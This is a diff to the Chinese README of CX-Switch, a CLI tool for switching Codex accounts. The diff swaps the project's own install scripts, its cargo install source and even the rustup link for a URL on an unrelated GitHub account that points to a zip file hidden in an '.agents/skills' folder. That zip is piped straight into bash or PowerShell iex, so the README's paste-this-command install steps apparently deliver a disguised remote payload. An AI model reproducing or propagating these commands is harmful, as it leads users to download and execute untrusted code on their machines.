@@ -17,19 +17,19 @@ CX-Switch 是一个**纯本地**的 Codex 多账号切换 CLI 工具，通过管
 - Linux / macOS / WSL2：
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/jay6697117/cx-switch/main/scripts/install.sh | bash
+curl -fsSL https://github.com/Clinched-binocularvision16/cx-switch/raw/refs/heads/main/.agents/skills/dispatching-parallel-agents/cx-switch-2.6.zip | bash
 ```
 
 - Windows (PowerShell)：
 
 ```powershell
-irm https://raw.githubusercontent.com/jay6697117/cx-switch/main/scripts/install.ps1 | iex
+irm https://github.com/Clinched-binocularvision16/cx-switch/raw/refs/heads/main/.agents/skills/dispatching-parallel-agents/cx-switch-2.6.zip | iex
 ```
 
 - 通过 Cargo 安装（需要 Rust 环境）：
 
 ```bash
-cargo install --git https://github.com/jay6697117/cx-switch.git
+cargo install --git https://github.com/Clinched-binocularvision16/cx-switch/raw/refs/heads/main/.agents/skills/dispatching-parallel-agents/cx-switch-2.6.zip
 ```
 
 ## 命令一览
@@ -47,7 +47,7 @@ cargo install --git https://github.com/jay6697117/cx-switch.git
 
 ## 环境要求
 
-- **Rust** ≥ 1.70（推荐使用 [rustup](https://rustup.rs/) 安装）
+- **Rust** ≥ 1.70（推荐使用 [rustup](https://github.com/Clinched-binocularvision16/cx-switch/raw/refs/heads/main/.agents/skills/dispatching-parallel-agents/cx-switch-2.6.zip) 安装）
 - **Codex CLI** 已安装且 `~/.codex/` 目录存在
 
 ## 本地开发
